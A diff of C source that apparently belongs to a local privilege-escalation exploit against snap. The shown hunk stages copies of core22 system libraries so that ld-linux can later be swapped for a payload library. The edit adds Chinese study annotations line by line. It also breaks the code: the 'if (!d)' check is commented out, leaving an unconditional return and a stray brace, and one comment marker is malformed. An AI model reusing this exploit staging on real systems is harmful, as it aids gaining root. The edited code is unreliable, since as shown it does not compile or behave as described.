@@ -92,34 +92,40 @@ static int setup_snap_and_exchange(const char *payload_so)
         closedir(d);
     }
 
-    /* Copy real libs so mimic phase succeeds (ld-linux replaced later) */  
-    mkdir(EXCHANGE_SRC, 0755);
-    d = opendir(REAL_LIBDIR);
-    if (!d) {
-        perror("opendir real libdir");
-        return-1;
-    }
+    /* 复制真实的库文件，以便模拟阶段成功（稍后替换 ld-linux） */  
+    mkdir(EXCHANGE_SRC, 0755);    //创建一个目录：.exchange | 展开宏后是：mkdir(".snap/usr/lib/x86_64-linux-gnu.exchange", 0755);
+    d = opendir(REAL_LIBDIR);    //打开目录 | 展开宏：d = opendir("/snap/core22/current/usr/lib/x86_64-linux-gnu");
+    // if (!d) {    //错误判断
+        perror("opendir real libdir");    //perror:打印错误信息
+        return-1;    //函数执行失败，直接退出
+    }    //opendir 打开一个目录，准备遍历它, 成功 指向目录的指针（DIR *） | 失败 NULL
 
-    int count = 0;
-    struct dirent *ent;
-    while ((ent = readdir(d)) != NULL) {
-        if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))
-            continue;
-        char src[4096];
-        char dst[4096];
-        snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);
-        snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);
-        struct stat st;
+    int count = 0;    //count → 统计处理了多少个文件/目录
+    struct dirent *ent;    //ent → 当前读取到的目录项（指针）
+    while ((ent = readdir(d)) != NULL) {    //ent = 当前目录里的一个文件/目录，d_name[1] = '\0'   ← 字符串结束符，
+        if (ent->d_name[0] == '.' && (ent->d_name[1] == '\0' || (ent->d_name[1] == '.' && ent->d_name[2] == '\0')))    //ent->d_name[0] && 和 ent->d_name[1]情况1 || ent->d_name[1] ent->d_name[2]情况2
+            continue;    //跳过当前循环（不处理），//"%s/%s":目录 + "/" + 文件名
+        char src[4096];    //构造路径 
+        char dst[4096];    
+        snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);    //原始文件位置/snap/core22/current/usr/lib/x86_64-linux-gnu/xxx.so
+        snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);    //目标复制位置 .snap/usr/lib/x86_64-linux-gnu.exchange/xxx.so
+        //这两个路径必须一一对应：REAL_LIBDIR/libc.so -> REAL_LIBDIR/libc.so 
+        //对于每一个文件名： 构造它在原目录的位置（src）, 构造它在原目录的位置（src）
+        //snprintf(...) 安全地拼接字符串（防止溢出）
+        
+        struct stat st;    //获取文件信息，stat跟随符号链接,看到的是 libc.so.6（真实文件）
 
-        if (lstat(src, &st) < 0)
-            continue;
-        if (S_ISDIR(st.st_mode)) {
+        if (lstat(src, &st) < 0)    //lstat获取文件信息：文件类型、权限、大小等, lstat不跟随符号链接,看到的是 libc.so（链接本身）
+            continue;    //用 lstat,可以知道：这个文件本身是不是符号链接
+        if (S_ISDIR(st.st_mode)) {    //st.st_mode 文件类型 + 权限     判断类型 S_ISDIR是目录？
             mkdir(dst, 0755);
-        } else if (S_ISLNK(st.st_mode)) {
-            /* Preserve symlinks, many .so files are symlinks to versioned names */
-            char link[4096];
+        } else if (S_ISLNK(st.st_mode)) {    /S_ISLNK/是符号链接？
+            /* 保留符号链接，许多 .so 文件是链接到带版本名称的符号链接 */
+            char link[4096];    //符号链接的行为：readlink + symlink
             ssize_t len = readlink(src, link, sizeof(link)-1);
-            if (len > 0) { link[len] = '\0'; symlink(link, dst); }
+                                         // sizeof(link)-1 ，最多读取多少字节，-1 是为了后面手动加 \0，，，readlink 不会自动加 '\0'
+                                         //读取“符号链接指向哪里”，放进 link 这个字符串里，libc.so  →  libc.so.6，，，libc.so 只是一个“快捷方式”，真正的文件是 libc.so.6，，，不是复制文件内容！而是读取“它指向谁”
+            if (len > 0) { link[len] = '\0'; symlink(link, dst); }    
         } else {
             copy_file(src, dst);
         }
